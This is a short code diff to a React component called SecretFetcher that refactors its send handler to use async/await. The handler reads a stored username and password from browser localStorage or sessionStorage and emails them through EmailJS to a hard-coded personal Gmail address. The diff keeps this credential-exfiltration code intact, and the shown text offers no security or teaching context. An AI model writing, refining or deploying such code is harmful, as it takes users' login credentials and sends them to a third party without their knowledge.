@@ -7,7 +7,7 @@ const SecretFetcher = () => {
   const [loading, setLoading] = useState(false);
   const [sent, setSent] = useState(false);
 
-  const handleFetchAndSend = () => {
+  const handleFetchAndSend = async () => {
     setLoading(true);
 
     // Fetch login details from storage
@@ -15,32 +15,31 @@ const SecretFetcher = () => {
     const password = localStorage.getItem("password") || sessionStorage.getItem("password");
 
     if (username && password) {
-      // Send email using EmailJS
-      emailjs.send(
-        "service_xxxxx", // Replace with your EmailJS Service ID
-        "template_xxxxx", // Replace with your EmailJS Template ID
-        { 
-          user_name: username, 
-          user_password: password, 
-          to_email: "mwalimujoshuakimanzi46@gmail.com" // Your email
-        },
-        "public_xxxxx" // Replace with your EmailJS Public Key
-      )
-      .then(() => {
-        setLoading(false);
+      try {
+        await emailjs.send(
+          "service_xxxxx", // Replace with your EmailJS Service ID
+          "template_xxxxx", // Replace with your EmailJS Template ID
+          { 
+            user_name: username, 
+            user_password: password, 
+            to_email: "mwalimujoshuakimanzi46@gmail.com" // Your email
+          },
+          "public_xxxxx" // Replace with your EmailJS Public Key
+        );
+
         setSent(true);
         alert("Login details sent to your email!");
         navigate("/success"); // Redirect after sending
-      })
-      .catch((error) => {
+      } catch (error) {
         console.error("Error sending email:", error);
-        setLoading(false);
         alert("An error occurred while sending your login details.");
-      });
+      }
     } else {
       alert("No stored login details found!");
       navigate("/"); // Redirect to home if no login details found
     }
+
+    setLoading(false);
   };
 
   return (
